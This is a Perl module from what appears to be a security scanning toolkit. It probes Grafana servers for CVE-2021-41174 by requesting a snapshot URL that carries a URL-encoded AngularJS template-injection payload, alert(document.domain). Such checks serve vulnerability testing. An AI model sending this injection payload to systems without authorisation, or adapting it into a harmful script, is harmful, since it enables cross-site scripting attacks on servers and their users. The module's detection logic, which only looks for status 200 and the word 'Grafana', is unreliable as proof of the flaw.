package Spellbook::Advisory::CVE_2021_41174 {
    use strict;
    use warnings;
    use Spellbook::Core::UserAgent;

    sub new {
        my ($self, $parameters) = @_;
        my ($help, $target, $snapshot_path, @result);

        Getopt::Long::GetOptionsFromArray (
            $parameters,
            "h|help"     => \$help,
            "t|target=s" => \$target
        );

        if ($target) {
            if ($target !~ /^http(s)?:\/\//msx) { 
                $target = "https://$target";
            }

            my $useragent = Spellbook::Core::UserAgent -> new();
            $snapshot_path = "dashboard/snapshot/%7B%7Bconstructor.constructor(%27alert(document.domain)%27)()%7D%7D?orgId=1";
            my $request = $useragent -> get ("$target/$snapshot_path");

            if (($request -> code() == 200) && ($request -> content() =~ /Grafana/ms)) {
                push @result, $target;
            }

            return @result;
        }

        if ($help) {
            return "
                \rExploit::CVE_2021_41174
                \r=======================
                \r-h, --help     See this menu
                \r-t, --target   Define a target\n\n";
        }

        return 0;
    }
}

1;
